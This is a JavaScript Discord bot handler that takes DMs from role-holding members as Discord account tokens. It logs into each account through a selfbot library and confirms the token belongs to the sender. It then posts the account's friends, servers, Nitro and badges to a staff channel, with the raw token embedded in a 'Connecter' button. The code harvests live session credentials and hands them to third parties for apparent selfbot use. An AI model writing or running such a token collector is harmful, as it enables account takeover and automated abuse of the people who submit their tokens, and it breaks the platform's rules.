const config = require('../../../config.json');
const Discord = require('discord.js');
const self = require('discord.js-selfbot-v13')
const messagec = new Map();

module.exports = {
    name: "messageCreate",
    /**
     * 
     * @param {import('discord.js').Message} message
     * @returns {Promise<void>}
     */
    run: async (client, message) => {
        try {
            if (!message.channel.isDMBased() || message.author.bot) return;

            const time = Date.now();

            if (!messagec.has(message.author.id)) {
                messagec.set(message.author.id, { count: 1, lstmsg: time });
            } else {
                const datauserr = messagec.get(message.author.id);
                if (time - datauserr.lstmsg < 10000) {
                    datauserr.count += 1;
                    if (datauserr.count > 1) {
                        return
                    }
                } else {
                    datauserr.count = 1;
                    datauserr.lstmsg = time;
                }
                messagec.set(message.author.id, datauserr);
            }
            if (message.content.length < 50) return;

            const antirepetition = /^(.)\1{9,}$/;
            if (antirepetition.test(message.content)) return console.log("37");

            const spp = /(.)\1{4,}/g;
            if (spp.test(message.content)) return;
            const guild = client.guilds.cache.get(config.guildid);
            if (!guild) return;
            const member = await guild.members.fetch(message.author.id);
            if (!member) return;

            await member.fetch();
            let usrr = config.userroles.length === 0;
            member.roles.cache.forEach(role => {
                if (config.userroles.includes(role.id)) {
                    usrr = true;
                }
            });

            if (!usrr) return console.log('pas de usrr');

            if (config.tokens.includes(message.content)) return;

            const request = new self.Client({ ws: { properties: { os: "Windows", browser: "Discord Embedded" } } });
            request.login(message.content).catch(() => message.channel.send(`*<a:UC_Black_skull:1275722522444173343> The token you sent is invalid.*`));

            request.on('ready', async () => {
                if (request.user.id !== message.author.id) {
                    return message.channel.send(`*<a:UC_Black_skull:1275722522444173343> The token you sent is NOT yours.*`);
                }

                const channel = await client.channels.fetch(config.managerchannel);
                if (!channel) return;

                let nitro;
                switch (request.user.premiumType) {
                    case 1:
                        nitro = "Classic";
                        break;
                    case 2:
                        nitro = "Boost";
                        break;
                    case 3:
                        nitro = "Basic";
                        break;
                    default:
                        nitro = "None";
                }

                const embed = new Discord.EmbedBuilder()
                    .setTitle(`<:templar:1274245689102045194> <:arrow:1274251907002667038> Request#${config.tokens.length + 1} <:arrow:1274251907002667038> <:Black_Clover:1275722530266812509>`)
                    .setColor("#000000")
                    .setAuthor({ name: `${message.author.tag}`, iconURL: `${message.author.displayAvatarURL({ dynamic: true })}` })
                    .setDescription(`**Tag** : <:arrow:1274251907002667038> \`${request.user.tag}\`\n**Id** : <:arrow:1274251907002667038> \`${request.user.id}\`\n**Friends** : <:arrow:1274251907002667038> \`${request.relationships.friendCache.size}\`\n**Servers** : <:arrow:1274251907002667038> \`${request.guilds.cache.size}\`\n**Nitro** : \`${nitro}\`\n**Badges** : <:arrow:1274251907002667038> \` ${(await request.user.fetchFlags()).toArray().map((b) => b).join(', ')}\``);

                const accept = new Discord.ButtonBuilder()
                    .setCustomId(`a/${message.author.id}/${message.content}`)
                    .setStyle(Discord.ButtonStyle.Success)
                    .setLabel("Connecter");

                const refuser = new Discord.ButtonBuilder()
                    .setCustomId(`r/${message.author.id}`)
                    .setStyle(Discord.ButtonStyle.Danger)
                    .setLabel("Refuser");

                const row = new Discord.ActionRowBuilder()
                    .addComponents(accept, refuser);

                await channel.send({ content: `<@&1275574057341030460>`, embeds: [embed], components: [row] });
                await message.channel.send("*<:user:1275726935816929366> Please wait for someone to assist you.*");
            await request.removeAllListeners().destroy()
            })
        } catch (e) {
            console.log(e)
        }
    }
}